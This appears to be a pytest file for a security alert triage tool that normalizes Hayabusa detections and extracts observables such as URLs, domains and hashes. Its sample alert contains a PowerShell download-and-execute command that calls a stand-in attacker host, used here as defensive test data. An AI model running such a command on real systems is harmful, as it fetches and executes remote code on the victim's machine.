import pytest

from triage.normalize import (
    HAYABUSA_LABEL_FIELDS,
    NormalizationError,
    compute_alert_id,
    normalize,
)
from triage.schemas import AlertIn, Severity

HAYABUSA = {
    "Timestamp": "2019-03-19T23:42:01.123Z",
    "RuleTitle": "Suspicious PowerShell Download",
    "Level": "high",
    "Computer": "PC01.example.corp",
    "Channel": "Sysmon",
    "EventID": 1,
    "RecordID": 42,
    "Details": {
        "Cmdline": "powershell -nop -c iwr http://evil.example.com/a.ps1 | iex",
        "Proc": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "PID": 1234,
        "User": "EXAMPLE\\alice",
        "ParentCmdline": "cmd.exe /c run.bat",
        "Hashes": "SHA1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,MD5=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB",
    },
    "ExtraFieldInfo": {"ParentImage": "C:\\Windows\\System32\\cmd.exe", "IntegrityLevel": "High"},
    "MitreTactics": ["Exec"],
    "MitreTags": ["T1059.001"],
    "OtherTags": ["sysmon"],
    "RuleFile": "proc_creation_win_powershell_download.yml",
    "RuleID": "rule-1",
    "EvtxFile": "Execution/powershell_download.evtx",
}


def test_hayabusa_mapping_and_label_stripping():
    alert = normalize(HAYABUSA, "hayabusa")
    assert alert.severity is Severity.high
    assert alert.process.image.endswith("powershell.exe")
    assert alert.process.parent_image.endswith("cmd.exe")
    assert alert.user == "EXAMPLE\\alice"
    assert alert.file.hashes == {"sha1": "a" * 40, "md5": "b" * 32}
    dumped = alert.model_dump_json()
    for field in HAYABUSA_LABEL_FIELDS:
        assert field not in dumped
    assert "T1059" not in dumped
    assert "Execution/" not in dumped


def test_observables_extracted():
    alert = normalize(HAYABUSA, "hayabusa")
    obs = {(o.type, o.value) for o in alert.observables}
    assert ("url", "http://evil.example.com/a.ps1") in obs
    assert ("domain", "evil.example.com") in obs
    assert ("sha1", "a" * 40) in obs
    assert not any(o.value.endswith(".exe") for o in alert.observables if o.type == "domain")


def test_private_ips_are_not_observables():
    payload = {
        "rule_title": "Net Conn",
        "timestamp": "2024-01-01T00:00:00Z",
        "network": {"src_ip": "10.0.0.5", "dst_ip": "185.220.101.4", "dst_port": 443},
    }
    alert = normalize(payload)
    ips = [o.value for o in alert.observables if o.type == "ipv4"]
    assert ips == ["185.220.101.4"]


def test_alert_id_is_deterministic_and_ref_based():
    a = AlertIn(rule_title="x", timestamp="2024-01-01T00:00:00Z", source="s", source_ref="r1")
    b = AlertIn(rule_title="different title", timestamp="2025-01-01T00:00:00Z", source="s", source_ref="r1")
    assert compute_alert_id(a) == compute_alert_id(b)
    c = AlertIn(rule_title="x", timestamp="2024-01-01T00:00:00Z")
    d = AlertIn(rule_title="x", timestamp="2024-01-01T00:00:01Z")
    assert compute_alert_id(c) != compute_alert_id(d)
    assert normalize(HAYABUSA, "hayabusa").alert_id == normalize(dict(HAYABUSA), "hayabusa").alert_id


def test_details_are_bounded():
    payload = {"rule_title": "x", "timestamp": "2024-01-01T00:00:00Z",
               "details": {f"k{i}": "v" * 10_000 for i in range(200)}}
    alert = normalize(payload)
    assert len(alert.details) <= 64
    assert all(len(v) <= 4096 for v in alert.details.values())


@pytest.mark.parametrize("payload, fmt", [([], "generic"), ({"rule_title": "x"}, "generic"),
                                          ({"Level": "weird"}, "hayabusa"), ({}, "cef")])
def test_invalid_payloads(payload, fmt):
    with pytest.raises(NormalizationError):
        normalize(payload, fmt)
